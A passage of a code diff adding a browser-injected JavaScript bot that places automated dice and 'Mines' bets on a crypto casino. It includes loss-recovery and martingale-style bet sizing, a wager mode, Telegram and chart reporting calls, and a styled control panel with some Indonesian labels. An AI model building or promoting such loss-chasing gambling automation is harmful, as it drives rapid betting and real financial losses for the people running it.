+            bot.recoveryMode = false;
+            bot.isWagerMode = bot.wasInWagerMode || false;
+            bot.isMinesMode = bot.wasInMinesMode || false;
+            return null;
+        }
+        
+        bot.recoveryBets++;
+        
+        if (bot.recoveryBets > bot.recoveryMaxBets) {
+            bot.recoveryMode = false;
+            bot.isWagerMode = bot.wasInWagerMode || false;
+            bot.isMinesMode = bot.wasInMinesMode || false;
+            return null;
+        }
+        
+        const chance = bot.baseChance;
+        const payout = 99 / chance;
+        
+        const targetRecovery = currentLoss * 0.7;
+        
+        let baseRecoveryBet = targetRecovery / (payout - 1);
+        
+        const progress = bot.recoveryBets / bot.recoveryMaxBets;
+        const smoothingMultiplier = 1 + (progress * bot.recoverySmoothingFactor);
+        
+        let bet = baseRecoveryBet * smoothingMultiplier;
+        
+        const minBetLimit = parseFloat(document.getElementById("p-minbet")?.value) || 0.00000002;
+        if (bet < minBetLimit) bet = minBetLimit;
+        if (bet > bot.stats.currentBal * 0.05) bet = bot.stats.currentBal * 0.05;
+        
+        return bet;
+    }
+
+    function checkWagerModeTriggers() {
+        if (!bot.isWagerEnabled || bot.isMinesMode || bot.recoveryMode) {
+            if (bot.isWagerMode) {
+                bot.isWagerMode = false;
+                bot.baseChance = bot.normalChance;
+                updateModeDisplay();
+            }
+            return;
+        }
+        
+        const baseBet = parseFloat(document.getElementById("p-basebet")?.value) || 0.00000001;
+        const profitInBaseBet = baseBet > 0 ? bot.stats.profit / baseBet : 0;
+        
+        const triggerProfit = parseFloat(document.getElementById("p-profit-trigger-profit")?.value) || 100;
+        const triggerLoss = parseFloat(document.getElementById("p-profit-trigger-loss")?.value) || 10;
+        
+        if (!bot.isWagerMode && profitInBaseBet >= triggerProfit) {
+            console.log('🎯 PROFIT MODE: Target reached! Entering WAGER MODE. Profit: ' + bot.stats.profit.toFixed(8) + ' (' + profitInBaseBet.toFixed(2) + 'x baseBet)');
+            enterWagerMode();
+        }
+        
+        if (bot.isWagerMode && profitInBaseBet <= triggerLoss) {
+            console.log('↩️ PROFIT MODE: Profit dropped to safe level. Exiting WAGER MODE. Profit: ' + bot.stats.profit.toFixed(8) + ' (' + profitInBaseBet.toFixed(2) + 'x baseBet)');
+            exitWagerMode();
+        }
+    }
+    
+    function enterWagerMode() {
+        bot.isWagerMode = true;
+        bot.normalChance = bot.baseChance;
+        
+        bot.profitWagerChance = parseFloat(document.getElementById("p-profit-wager-chance")?.value) || 99.0;
+        bot.profitWagerBetPct = parseFloat(document.getElementById("p-profit-wager-bet-pct")?.value) || 1.5;
+        bot.baseChance = bot.profitWagerChance;
+        
+        updateModeDisplay();
+    }
+    
+    function exitWagerMode() {
+        bot.isWagerMode = false;
+        bot.baseChance = bot.normalChance;
+        updateModeDisplay();
+    }
+
+    function updateModeDisplay() {
+        const modeEl = document.getElementById("st-mode");
+        if (!modeEl) return;
+        
+        if (bot.recoveryMode) {
+            modeEl.innerText = "RECOVERY";
+            modeEl.style.background = "#f59e0b";
+        } else if (bot.isMinesMode) {
+            modeEl.innerText = "MINES";
+            modeEl.style.background = "#8b5cf6";
+        } else if (bot.isWagerEnabled && bot.isWagerMode) {
+            modeEl.innerText = "WAGER";
+            modeEl.style.background = "#10b981";
+        } else {
+            modeEl.innerText = bot.isTrailingActive ? "TRAIL" : (bot.isDemo ? "DEMO" : "REAL");
+            modeEl.style.background = bot.isTrailingActive ? "#3b82f6" : (bot.isDemo ? "#f59e0b" : "#4b5563");
+        }
+        modeEl.style.color = "#ffffff";
+    }
+
+    function updateBetSpeed() {
+        const now = Date.now();
+        const timeDiff = (now - bot.lastSpeedUpdate) / 1000;
+        
+        if (timeDiff >= 1) {
+            bot.betSpeed = bot.speedBetsCount / timeDiff;
+            bot.speedBetsCount = 0;
+            bot.lastSpeedUpdate = now;
+            
+            const speedValEl = document.getElementById("st-speed-val");
+            if (speedValEl) {
+                speedValEl.innerText = bot.betSpeed.toFixed(2) + "/s";
+                if (bot.betSpeed < 10) {
+                    speedValEl.style.color = "#f59e0b";
+                } else {
+                    speedValEl.style.color = "#10b981";
+                }
+            }
+        }
+    }
+
+    async function runLoop() {
+        if (!bot.isRunning) return;
+        
+        try {
+            bot.lastBetTime = Date.now();
+            
+            checkMinesMode();
+            
+            if (bot.isMinesMode) {
+                const executed = await executeMinesBet();
+                if (executed && bot.isRunning) {
+                    setTimeout(runLoop, 500);
+                    return;
+                }
+            }
+            
+            if (!bot.isMinesMode) {
+                if (bot.isTrailingActive) updateTrailingPeak();
+                
+                if (bot.isTrailingActive && !bot.recoveryMode) {
+                    const wasReset = checkTrailingGap();
+                    if (wasReset && bot.isRunning) {
+                        setTimeout(runLoop, 0);
+                        return;
+                    }
+                }
+                
+                checkRecoveryMode();
+                checkWagerModeTriggers();
+                
+                let nextBet, currentChance;
+                
+                if (bot.recoveryMode) {
+                    currentChance = bot.baseChance;
+                    nextBet = calculateRecoveryBet();
+                    
+                    if (nextBet === null) {
+                        bot.recoveryMode = false;
+                        updateModeDisplay();
+                    }
+                }
+                
+                if (!bot.recoveryMode) {
+                    if (bot.singleChanceBets < bot.singleChanceLimit) {
+                        bot.currentChance = bot.baseChance;
+                    } else {
+                        bot.currentChance = Math.min(98, bot.baseChance + getChanceIncrement());
+                    }
+                    currentChance = bot.currentChance;
+                    
+                    if (bot.isWagerEnabled && bot.isWagerMode) {
+                        bot.profitWagerBetPct = parseFloat(document.getElementById("p-profit-wager-bet-pct")?.value) || 1.5;
+                        nextBet = bot.stats.currentBal * (bot.profitWagerBetPct / 100);
+                        
+                        const minBetLimit = parseFloat(document.getElementById("p-minbet")?.value) || 0.00000002;
+                        if (nextBet < minBetLimit) nextBet = minBetLimit;
+                    } else {
+                        const payout = 99 / currentChance;
+                        const margin = parseFloat(document.getElementById("p-margin")?.value) || 1.005;
+                        const minBetLimit = parseFloat(document.getElementById("p-minbet")?.value) || 0.00000002;
+                        const baseBet = parseFloat(document.getElementById("p-basebet")?.value) || 0.00000001;
+                        
+                        nextBet = (Math.abs(bot.tg) / (payout - 1)) * margin;
+                        if (bot.tg === bot.perStep) nextBet = baseBet;
+                        if (nextBet < minBetLimit) nextBet = minBetLimit;
+                    }
+                    
+                    if (nextBet > bot.stats.currentBal && bot.stats.currentBal > 0) nextBet = bot.stats.currentBal;
+                }
+
+                if (nextBet && currentChance) {
+                    const res = await API.placeBet(nextBet, currentChance);
+                    const d = res?.data?.diceRoll || res?.diceRoll;
+
+                    if (d) {
+                        bot.speedBetsCount++;
+                        updateBetSpeed();
+                        
+                        const win = d.payout > 0;
+                        
+                        if (bot.isTrailingActive) updateTrailingStreaks(win);
+                        
+                        const pft = d.payout - d.amount;
+                        bot.stats.bets++; 
+                        bot.currentSteps++;
+                        bot.stats.wagered += d.amount;
+                        bot.stats.profit += pft; 
+                        bot.stats.currentBal += pft;
+                        bot.lastBetAmount = d.amount;
+
+                        if (!bot.stats.history) bot.stats.history = [];
+                        bot.stats.history.push(bot.stats.currentBal);
+                        if (bot.stats.history.length > 50) bot.stats.history.shift();
+
+                        if (bot.stats.currentBal < bot.stats.startBal) {
+                            let dd = bot.stats.startBal - bot.stats.currentBal;
+                            let ddPerc = (dd / bot.stats.startBal) * 100;
+                            if (dd > bot.stats.maxDD) bot.stats.maxDD = dd;
+                            if (ddPerc > bot.stats.maxDDPerc) bot.stats.maxDDPerc = ddPerc;
+                        }
+
+                        updateLogs(d.amount, currentChance, bot.stats.profit, win, bot.recoveryMode);
+
+                        if (win) { 
+                            bot.stats.wins++; 
+                            
+                            if (bot.recoveryMode) {
+                                const currentLoss = bot.stats.startBal - bot.stats.currentBal;
+                                if (currentLoss <= bot.recoveryStartLoss * 0.5) {
+                                    bot.recoveryMode = false;
+                                    bot.isWagerMode = bot.wasInWagerMode || false;
+                                    bot.isMinesMode = bot.wasInMinesMode || false;
+                                    console.log("✅ RECOVERY COMPLETE");
+                                }
+                            }
+                            
+                            setNewBaseChance();
+                        } else { 
+                            bot.stats.loss++; 
+                            
+                            if (!bot.recoveryMode) {
+                                bot.singleChanceBets++; 
+                                bot.tg += (d.amount + bot.perStep);
+                            }
+                        }
+
+                        updateDisplay();
+
+                        const currentWagerFloor = Math.floor(bot.stats.wagered / bot.chartReportInterval);
+                        const lastWagerFloor = Math.floor(bot.lastChartWagerAmount / bot.chartReportInterval);
+                        
+                        if (currentWagerFloor > lastWagerFloor && bot.stats.bets > 0) {
+                            console.log('📊 Wagered reached ' + (currentWagerFloor * bot.chartReportInterval) + ' - sending chart report...');
+                            await API.sendChartReport();
+                        }
+                        
+                        bot.lastChartWagerAmount = bot.stats.wagered;
+
+                        if (bot.stats.profit >= bot.targetAbs) { 
+                            alert("🎯 TARGET REACHED! " + bot.stats.profit.toFixed(8)); 
+                            bot.isRunning = false; 
+                        }
+                        else if (bot.stats.profit <= -bot.stopLossAbs) { 
+                            alert("🛑 STOP LOSS TRIGGERED! " + bot.stats.profit.toFixed(8)); 
+                            bot.isRunning = false; 
+                        }
+                        else if (bot.currentSteps >= bot.maxSteps) { 
+                            resetSteps();
+                        }
+                    }
+                }
+            }
+            
+            const tgNow = Date.now();
+            if (tgNow - bot.lastTelegramTime >= bot.telegramInterval) {
+                await API.sendTelegramReport();
+                bot.lastTelegramTime = tgNow;
+            }
+            
+            const runtime = Math.floor((Date.now() - bot.stats.startTime) / 1000);
+            bot.runtime.hours = Math.floor(runtime / 3600);
+            bot.runtime.minutes = Math.floor((runtime % 3600) / 60);
+            bot.runtime.seconds = runtime % 60;
+            
+            if (bot.isRunning && !bot.isMinesMode) {
+                setTimeout(runLoop, 0);
+            }
+        } catch (e) { 
+            console.log("Loop error:", e);
+            if (bot.isRunning) {
+                setTimeout(runLoop, 100);
+            }
+        }
+    }
+
+    function updateLogs(amt, ch, totalProfit, isWin, isRecovery) {
+        if (isRecovery === undefined) isRecovery = false;
+        const logBox = document.getElementById("p-logs");
+        const entry = document.createElement("div");
+        
+        const amtStr = amt.toFixed(8).padStart(12, ' ');
+        const chStr = ch.toFixed(2).padStart(6, ' ');
+        const profitStr = (totalProfit >= 0 ? '+' : '') + totalProfit.toFixed(8);
+        
+        let borderColor = isWin ? "#10b981" : "#ef4444";
+        if (isRecovery) borderColor = "#f59e0b";
+        
+        entry.style.cssText = 'margin:1px 0; padding:1px 2px; font-size:10px; font-family: "Menlo", "Monaco", "Courier New", monospace; border-left:2px solid ' + borderColor + '; color:#d1d5db;';
+        entry.innerHTML = amtStr + ' | ' + chStr + '% | ' + profitStr;
+        logBox.prepend(entry);
+        if (logBox.children.length > 6) logBox.lastChild.remove();
+    }
+
+    function updateDisplay() {
+        document.getElementById("st-chance").innerText = bot.baseChance.toFixed(1) + "%";
+        document.getElementById("st-next").innerText = bot.currentChance.toFixed(1) + "%";
+        document.getElementById("st-steps").innerText = bot.currentSteps + "/" + bot.maxSteps.toLocaleString();
+        document.getElementById("st-peak").innerText = bot.trailingPeak.toFixed(8);
+        document.getElementById("st-gap").innerText = bot.trailingCurrentGap.toFixed(3) + "%";
+        document.getElementById("st-zone").innerText = bot.trailingZone;
+        document.getElementById("st-trail-hits").innerText = bot.trailingHits;
+        
+        const runtimeElem = document.getElementById("st-runtime");
+        if (runtimeElem) {
+            runtimeElem.innerText = bot.runtime.hours + 'h ' + bot.runtime.minutes + 'm ' + bot.runtime.seconds + 's';
+        }
+        
+        if (document.getElementById("st-mines-bets")) {
+            document.getElementById("st-mines-bets").innerText = bot.mines.totalBets;
+            document.getElementById("st-mines-wagered").innerText = bot.mines.totalWagered.toFixed(2);
+            document.getElementById("st-mines-profit").innerText = bot.mines.totalProfit.toFixed(2);
+            document.getElementById("st-mines-maxpayout").innerText = bot.mines.globalMaxPayout.toFixed(4);
+            document.getElementById("st-mines-lastpayout").innerText = bot.mines.lastPayout.toFixed(4);
+            
+            const profitEl = document.getElementById("st-mines-profit");
+            if (profitEl) {
+                profitEl.className = "stat-value " + (bot.mines.totalProfit >= 0 ? "success" : "warning");
+            }
+            
+            const minesModeStatus = document.getElementById("st-mines-mode");
+            if (minesModeStatus) {
+                minesModeStatus.innerText = bot.isMinesMode ? "ACTIVE" : "INACTIVE";
+                minesModeStatus.className = "stat-value " + (bot.isMinesMode ? "success" : "");
+            }
+        }
+    }
+
+    function initMinesUI() {
+        const minesSection = document.createElement("div");
+        minesSection.className = "section";
+        minesSection.id = "mines-section";
+        minesSection.innerHTML = `
+            <div class="section-header" onclick="toggleSection('mines')">
+                <span class="title">💣 MINES MODE (Menggantikan Risk Mode)</span>
+                <span class="collapse-btn" id="collapse-mines">▼</span>
+            </div>
+            <div class="section-content" id="content-mines">
+                <div style="background:#0f172a; padding:6px; border-radius:8px; margin-bottom:8px; font-size:9px; color:#8b5cf6;">
+                    <span>⚡ Mines aktif saat loss mencapai limit</span><br>
+                    <span>⚡ Bet amount = Math.abs(totalLoss / 5)</span>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Mines Limit %</label>
+                        <input id="p-mines-limit" value="3.0" step="0.1" min="0.5" max="20">
+                        <div class="info-tip">Trigger loss percentage</div>
+                    </div>
+                    <div class="input-group">
+                        <label>Max Mines Bets</label>
+                        <input id="p-mines-max-bets" value="5" min="1" max="20" type="number">
+                    </div>
+                </div>
+                
+                <div class="grid-2col">
+                    <div class="input-group">
+                        <label>Mines Count (1-24)</label>
+                        <select id="p-mines-count"></select>
+                    </div>
+                    <div class="input-group">
+                        <label>Random Fields</label>
+                        <div class="switch">
+                            <input type="checkbox" id="p-mines-random"> 
+                            <span class="switch-status" id="mines-random-status">OFF</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn btn-secondary" id="p-mines-fields" style="margin:8px 0;">🎛 Select Fixed Fields</button>
+                
+                <div class="stat-row">
+                    <span>Mines Bets Total</span>
+                    <span class="stat-value" id="st-mines-bets">0</span>
+                </div>
+                <div class="stat-row">
+                    <span>Mines Wagered</span>
+                    <span class="stat-value" id="st-mines-wagered">0.00</span>
+                </div>
+                <div class="stat-row">
+                    <span>Mines Profit</span>
+                    <span class="stat-value" id="st-mines-profit">0.00</span>
+                </div>
+                <div class="stat-row">
+                    <span>Max Payout</span>
+                    <span class="stat-value" id="st-mines-maxpayout">0.0000</span>
+                </div>
+                <div class="stat-row">
+                    <span>Last Payout</span>
+                    <span class="stat-value" id="st-mines-lastpayout">0.0000</span>
+                </div>
+                <div class="stat-row">
+                    <span>Mines Mode Status</span>
+                    <span class="stat-value" id="st-mines-mode">INACTIVE</span>
+                </div>
+            </div>
+        `;
+        
+        const wagerSection = document.querySelector('#content-wager')?.parentNode;
+        if (wagerSection) {
+            wagerSection.parentNode.insertBefore(minesSection, wagerSection.nextSibling);
+        } else {
+            const chanceSection = document.querySelector('#content-chance')?.parentNode;
+            if (chanceSection) {
+                chanceSection.parentNode.insertBefore(minesSection, chanceSection.nextSibling);
+            } else {
+                document.querySelector('#tab-config').appendChild(minesSection);
+            }
+        }
+        
+        const minesCountSelect = document.getElementById("p-mines-count");
+        for (let i = 1; i <= 24; i++) {
+            const opt = document.createElement("option");
+            opt.value = i;
+            opt.textContent = i;
+            if (i === 13) opt.selected = true;
+            minesCountSelect.appendChild(opt);
+        }
+        
+        const savedFields = loadMinesFields();
+        bot.minesFields = savedFields;
+        
+        const savedLimit = localStorage.getItem('mine_limit');
+        if (savedLimit) {
+            document.getElementById("p-mines-limit").value = savedLimit;
+            bot.minesLimit = parseFloat(savedLimit);
+        }
+        
+        const savedMaxBets = localStorage.getItem('mine_maxBets');
+        if (savedMaxBets) {
+            document.getElementById("p-mines-max-bets").value = savedMaxBets;
+            bot.minesMaxBets = parseInt(savedMaxBets);
+        }
+        
+        const savedMinesCount = localStorage.getItem('mine_minesCount');
+        if (savedMinesCount) {
+            document.getElementById("p-mines-count").value = savedMinesCount;
+            bot.minesMinesCount = parseInt(savedMinesCount);
+        }
+        
+        const savedRandom = localStorage.getItem('mine_randomFields');
+        if (savedRandom) {
+            const randomCheck = document.getElementById("p-mines-random");
+            randomCheck.checked = savedRandom === 'true';
+            bot.minesUseRandomFields = savedRandom === 'true';
+            const statusEl = document.getElementById("mines-random-status");
+            if (statusEl) {
+                statusEl.innerText = randomCheck.checked ? "ON" : "OFF";
+                statusEl.className = "switch-status " + (randomCheck.checked ? "on" : "off");
+            }
+        }
+        
+        document.getElementById("p-mines-random").onchange = function(e) {
+            bot.minesUseRandomFields = e.target.checked;
+            localStorage.setItem('mine_randomFields', e.target.checked);
+            const statusEl = document.getElementById("mines-random-status");
+            if (statusEl) {
+                statusEl.innerText = e.target.checked ? "ON" : "OFF";
+                statusEl.className = "switch-status " + (e.target.checked ? "on" : "off");
+            }
+        };
+        
+        document.getElementById("p-mines-fields").onclick = createMinesFieldSelector;
+        
+        document.getElementById("p-mines-limit").onchange = function(e) {
+            bot.minesLimit = parseFloat(e.target.value);
+            localStorage.setItem('mine_limit', e.target.value);
+        };
+        
+        document.getElementById("p-mines-max-bets").onchange = function(e) {
+            bot.minesMaxBets = parseInt(e.target.value);
+            localStorage.setItem('mine_maxBets', e.target.value);
+        };
+        
+        document.getElementById("p-mines-count").onchange = function(e) {
+            bot.minesMinesCount = parseInt(e.target.value);
+            localStorage.setItem('mine_minesCount', e.target.value);
+        };
+    }
+    
+    function loadMinesFields() {
+        try {
+            const fields = JSON.parse(localStorage.getItem('mine_fields'));
+            return fields && fields.length > 0 ? fields : [0,1,2,3,4];
+        } catch (e) {
+            return [0,1,2,3,4];
+        }
+    }
+    
+    function saveMinesFields(fields) {
+        localStorage.setItem('mine_fields', JSON.stringify(fields));
+    }
+    
+    function createMinesFieldSelector() {
+        const existingModal = document.getElementById("mines-fields-modal");
+        if (existingModal) existingModal.remove();
+        
+        const modal = document.createElement("div");
+        modal.id = "mines-fields-modal";
+        modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        `;
+        
+        const box = document.createElement("div");
+        box.style.cssText = `
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 350px;
+            border: 1px solid #8b5cf6;
+        `;
+        
+        const title = document.createElement("div");
+        title.style.cssText = `
+            text-align: center;
+            color: #8b5cf6;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 14px;
+        `;
+        title.textContent = "PILIH FIELD MINES (5x5)";
+        box.appendChild(title);
+        
+        const grid = document.createElement("div");
+        grid.style.cssText = `
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        `;
+        
+        const selectedFields = bot.minesFields.slice();
+        
+        for (let i = 0; i < 25; i++) {
+            const cell = document.createElement("div");
+            cell.style.cssText = `
+                aspect-ratio: 1/1;
+                background: #333;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: pointer;
+                font-weight: bold;
+                border-radius: 8px;
+                color: #fff;
+                font-size: 12px;
+                transition: all 0.2s;
+            `;
+            cell.textContent = i;
+            if (selectedFields.indexOf(i) !== -1) {
+                cell.style.background = "#8b5cf6";
+                cell.style.color = "#fff";
+                cell.style.boxShadow = "0 0 10px #8b5cf6";
+            }
+            
+            cell.onclick = function() {
+                const idx = selectedFields.indexOf(i);
+                if (idx !== -1) {
+                    selectedFields.splice(idx, 1);
+                    cell.style.background = "#333";
+                    cell.style.color = "#fff";
+                    cell.style.boxShadow = "none";
+                } else {
+                    selectedFields.push(i);
+                    cell.style.background = "#8b5cf6";
+                    cell.style.color = "#fff";
+                    cell.style.boxShadow = "0 0 10px #8b5cf6";
+                }
+            };
+            
+            grid.appendChild(cell);
+        }
+        
+        box.appendChild(grid);
+        
+        const info = document.createElement("div");
+        info.style.cssText = `
+            font-size: 11px;
+            color: #94a3b8;
+            margin-bottom: 15px;
+            text-align: center;
+        `;
+        info.innerHTML = 'Pilih minimal ' + bot.minesMinesCount + ' field (sesuai Mines Count)';
+        box.appendChild(info);
+        
+        const saveBtn = document.createElement("button");
+        saveBtn.textContent = "💾 SIMPAN FIELDS";
+        saveBtn.style.cssText = `
+            width: 100%;
+            padding: 12px;
+            background: #8b5cf6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+        `;
+        
+        saveBtn.onmouseover = function() {
+            saveBtn.style.background = "#7c3aed";
+        };
+        
+        saveBtn.onmouseout = function() {
+            saveBtn.style.background = "#8b5cf6";
+        };
+        
+        saveBtn.onclick = function() {
+            if (selectedFields.length < bot.minesMinesCount) {
+                alert('⚠️ Pilih minimal ' + bot.minesMinesCount + ' field!');
+                return;
+            }
+            bot.minesFields = selectedFields;
+            saveMinesFields(selectedFields);
+            modal.remove();
+        };
+        
+        box.appendChild(saveBtn);
+        modal.appendChild(box);
+        
+        modal.onclick = function(e) {
+            if (e.target === modal) modal.remove();
+        };
+        
+        document.body.appendChild(modal);
+    }
+
+    function createUI() {
+        if (document.getElementById("orion-wrap")) document.getElementById("orion-wrap").remove();
+        
+        const s = document.createElement("style");
+        s.innerHTML = `
+            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+            
+            @media (max-width: 480px) {
+                #orion-wrap {
+                    width: 98% !important;
+                    right: 1% !important;
+                    left: 1% !important;
+                    top: 5px !important;
+                    max-height: 95vh !important;
+                    font-size: 11px !important;
+                }
+            }
+            
+            #orion-wrap {
+                position: fixed;
+                top: 10px;
+                right: 10px;
+                width: 420px;
+                z-index: 9999;
+                background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
+                color: #f1f5f9;
+                border-radius: 16px;
+                padding: 16px;
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+                border: 1px solid rgba(245, 158, 11, 0.2);
+                box-shadow: 0 20px 35px -10px rgba(0,0,0,0.6), 0 0 0 1px rgba(245, 158, 11, 0.1) inset;
+                max-height: 90vh;
+                overflow-y: auto;
+                scrollbar-width: thin;
+                scrollbar-color: #f59e0b #1e293b;
+                backdrop-filter: blur(8px);
+            }
+            
+            #orion-wrap::-webkit-scrollbar {
+                width: 4px;
+            }
+            
+            #orion-wrap::-webkit-scrollbar-track {
+                background: #1e293b;
+            }
+            
+            #orion-wrap::-webkit-scrollbar-thumb {
+                background: #f59e0b;
+                border-radius: 4px;
+            }
+            
+            .glass-effect {
+                background: rgba(30, 41, 59, 0.7);
+                backdrop-filter: blur(4px);
+                border: 1px solid rgba(245, 158, 11, 0.1);
+            }
+            
+            .tab-buttons {
+                display: flex;
+                gap: 8px;
+                margin-bottom: 16px;
+                background: rgba(15, 23, 42, 0.6);
+                padding: 4px;
+                border-radius: 12px;
+                border: 1px solid rgba(245, 158, 11, 0.15);
+            }
+            
+            .tab-btn {
+                flex: 1;
+                background: transparent;
+                border: none;
+                color: #94a3b8;
+                padding: 8px 12px;
+                font-size: 13px;
+                font-weight: 600;
+                cursor: pointer;
+                border-radius: 8px;
+                transition: all 0.2s;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                font-family: 'Inter', sans-serif;
+            }
+            
+            .tab-btn.active {
+                background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+                color: #000000;
+                box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
+            }
+            
+            .tab-content {
+                display: none;
+            }
+            
+            .tab-content.active {
+                display: block;
+            }
+            
+            .section { 
+                margin-bottom: 12px; 
+                background: rgba(15, 23, 42, 0.5);
+                border-radius: 12px;
+                padding: 8px 10px;
+                border: 1px solid rgba(245, 158, 11, 0.1);
+            }
+            
+            .section-header {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                cursor: pointer;
+                padding: 6px 0;
+                user-select: none;
+                border-radius: 6px;
+                color: #f59e0b;
+                font-size: 12px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                font-weight: 600;
+            }
+            
+            .section-header:hover {
+                color: #fbbf24;
+            }
+            
+            .section-header .title { 
+                font-weight: 600; 
+                margin: 0;
+            }
+            
+            .collapse-btn {
+                color: #f59e0b;
+                font-size: 14px;
+                width: 20px;
+                text-align: center;
+                transition: transform 0.2s;
+            }
+            
+            .collapse-btn.collapsed {
+                transform: rotate(-90deg);
+            }
+            
+            .section-content {
+                transition: all 0.2s ease;
+                overflow: hidden;
+                margin-top: 8px;
+            }
+            
+            .section-content.collapsed {
+                display: none;
+            }
+            
+            .grid-2col { 
+                display: grid; 
+                grid-template-columns: 1fr 1fr; 
+                gap: 10px; 
+                margin-top: 6px; 
+            }
+            
+            .grid-3col {
+                display: grid;
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 8px;
+                margin-top: 6px;
+            }
+            
+            .input-group { 
+                margin-bottom: 8px; 
+            }
+            
+            .input-group label { 
+                display: block; 
+                font-size: 10px; 
+                color: #94a3b8; 
+                margin-bottom: 4px; 
+                font-weight: 500;
+                text-transform: uppercase;
+                letter-spacing: 0.3px;
+            }
+            
+            .input-group input, .input-group select {
+                width: 100%; 
+                padding: 6px 8px; 
+                background: #0f172a; 
+                border: 1px solid #334155;
+                color: #f1f5f9; 
+                border-radius: 8px; 
+                font-size: 11px; 
+                box-sizing: border-box;
+                font-family: 'Inter', monospace;
+                transition: all 0.2s;
+            }
+            
+            .input-group input:focus, .input-group select:focus {
+                outline: none;
+                border-color: #f59e0b;
+                box-shadow: 0 0 0 2px rgba(245, 158, 11, 0.2);
+            }
+            
+            .input-group input[readonly] {
+                background: #1e293b;
+                border-color: #475569;
+                color: #94a3b8;
+            }
+            
+            .stat-row {
+                display: flex; 
+                justify-content: space-between; 
+                align-items: center;
+                font-size: 11px; 
+                background: #0f172a; 
+                padding: 6px 10px; 
+                margin: 3px 0; 
+                border-radius: 8px;
+                border-left: 3px solid #f59e0b;
+                color: #e2e8f0;
+                font-weight: 500;
+            }
+            
+            .stat-value {
+                font-family: 'Inter', monospace;
+                text-align: right;
+                font-weight: 600;
+                color: #f59e0b;
+            }
+            
+            .btn {
+                width: 100%; 
+                padding: 10px; 
+                margin: 2px 0; 
+                border: none; 
+                border-radius: 10px;
+                font-weight: 600; 
+                cursor: pointer; 
+                font-size: 12px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                transition: all 0.2s;
+                font-family: 'Inter', sans-serif;
+            }
+            
+            .btn-primary { 
+                background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); 
+                color: #000000; 
+                box-shadow: 0 4px 12px rgba(245, 158, 11, 0.2);
+            }
+            
+            .btn-primary:hover:not(:disabled) { 
+                transform: translateY(-1px);
+                box-shadow: 0 6px 16px rgba(245, 158, 11, 0.3);
+            }
+            
+            .btn-primary:disabled { 
+                background: #475569; 
+                cursor: not-allowed; 
+                opacity: 0.5;
+                box-shadow: none;
+            }
+            
+            .btn-danger { 
+                background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); 
+                color: #ffffff; 
+                box-shadow: 0 4px 12px rgba(239, 68, 68, 0.2);
+            }
+            
+            .btn-danger:hover:not(:disabled) { 
+                transform: translateY(-1px);
+                box-shadow: 0 6px 16px rgba(239, 68, 68, 0.3);
+            }
+            
+            .btn-danger:disabled { 
+                background: #475569; 
+                cursor: not-allowed; 
+                opacity: 0.5;
+                box-shadow: none;
+            }
+            
+            .btn-secondary {
+                background: linear-gradient(135deg, #475569 0%, #334155 100%);
+                color: #ffffff;
+            }
+            
+            .badge {
+                display: inline-block; 
+                padding: 4px 10px; 
+                border-radius: 20px;
+                font-size: 10px; 
+                background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); 
+                color: #000000;
+                font-weight: 600;
+                text-transform: uppercase;
+                letter-spacing: 0.3px;
+            }
+            
+            #p-logs { 
+                background: #0f172a; 
+                padding: 6px; 
+                border-radius: 10px; 
+                height: 90px; 
+                overflow-y: auto; 
+                font-size: 10px;
+                font-family: 'Inter', monospace;
+                border: 1px solid #334155;
+                color: #94a3b8;
+            }
+            
+            #p-logs div {
+                border-bottom: 1px solid #1e293b;
+            }
+            
+            .flex { 
+                display: flex; 
+                align-items: center; 
+                gap: 8px; 
+            }
+            
+            .switch { 
+                display: flex; 
+                align-items: center; 
+                gap: 10px; 
+                background: #0f172a;
+                padding: 6px 10px;
+                border-radius: 8px;
+                border: 1px solid #334155;
+            }
+            
+            .switch input { 
+                width: 18px; 
+                height: 18px;
+                accent-color: #f59e0b;
+                margin: 0;
+            }
+            
+            .switch span { 
+                font-size: 11px;
+                color: #f1f5f9;
+                font-weight: 500;
+            }
+            
+            .switch-status {
+                font-size: 9px;
+                padding: 3px 8px;
+                border-radius: 12px;
+                background: #1e293b;
+                color: #94a3b8;
+                border: 1px solid #334155;
+                font-weight: 600;
+            }
+            
+            .switch-status.on {
+                background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+                color: #ffffff;
+                border: none;
+            }
+            
+            .switch-status.off {
+                background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+                color: #ffffff;
+                border: none;
+            }
+            
+            .sub-title { 
+                font-size: 11px; 
+                margin: 12px 0 6px 0; 
+                color: #f59e0b; 
+                font-weight: 600;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
+                padding-left: 6px;
+            }
+            
+            .warning { 
+                color: #f59e0b; 
+            }
+            
+            .success { 
+                color: #10b981; 
+            }
+            
+            #st-user {
+                background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
+                padding: 8px;
+                border-radius: 10px;
+                border: 1px solid rgba(245, 158, 11, 0.2);
+                font-size: 10px;
+                color: #94a3b8;
+                text-align: center;
+                margin: 12px 0;
+                font-weight: 500;
+            }
+            
+            .footer-copyright {
+                text-align: center;
+                font-size: 9px;
